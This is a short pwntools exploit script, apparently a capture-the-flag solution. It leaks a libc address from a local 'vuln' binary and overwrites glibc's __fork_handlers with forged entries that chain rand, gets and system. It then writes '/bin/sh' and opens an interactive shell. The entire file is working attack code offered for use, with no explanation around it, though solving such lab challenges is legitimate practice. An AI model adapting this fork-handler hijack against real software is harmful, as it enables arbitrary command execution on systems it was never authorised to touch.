#!/usr/bin/python3
from pwn import *

e = context.binary = ELF('vuln')
libc = ELF('libc', checksec=False)

p = e.process()

def forge(addr, *funcs):
    assert funcs
    data = b""
    for i, func in enumerate(funcs):
        next = addr+len(data)+0x30
        data += flat({
            0x00: next if i==len(funcs)-1 else 0,
            0x08: func,
            0x28: p32(1),
        }, length=0x30)
    return data

def forge_packed(addr, *funcs, smallest=False):
    assert funcs
    if smallest:
        # some refcntrs are outside our data
        # (except the first one, which we need to control)
        # these will be incremented, and potentially corrupt some memory
        # be careful when using this
        size = max(0x28+4, 0x10*len(funcs))
    else:
        # all refcntrs are contained in our data
        size = 0x28 + 0x10*len(funcs) - 0xc
    data = bytearray(size)
    addrs = [addr+0x10*i for i in range(1, len(funcs))] + [0]
    for i, (addr, func) in enumerate(zip(addrs, funcs)):
        off = i*0x10
        data[off:off+0x10] = p64(addr) + p64(func)
    for i in range(len(funcs)):
        off = 0x28 + 0x10*i
        if off+4 > len(data):
            break
        val = u32(bytes(data[off:off+4])) - 1
        # the first refcntr must be non-zero
        # otherwise it'll loop forever
        if i == 0:
            assert val != 0
        data[off:off+4] = p32(val % (1<<32))
    return bytes(data)

fgets = int(p.recvline(), 16)
log.info(f"fgets: {hex(fgets)}")

libc.address = fgets - libc.sym.fgets
log.info(f"libc: {hex(libc.address)}")

addr = libc.sym.__fork_handlers
data = p64(addr+8) + forge_packed(addr+8, libc.sym.rand, libc.sym.gets, libc.sym.rand, libc.sym.system)
assert b"\n" not in data

extra_data = flat({
    0x00: b"/bin/sh\x00",
    0x10: libc.sym.randtbl+4,
    0x18: p32(0),   # TYPE_0
})
assert b"\n" not in extra_data

#gdb.attach(p)
p.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)
p.sendline(extra_data)

p.interactive()
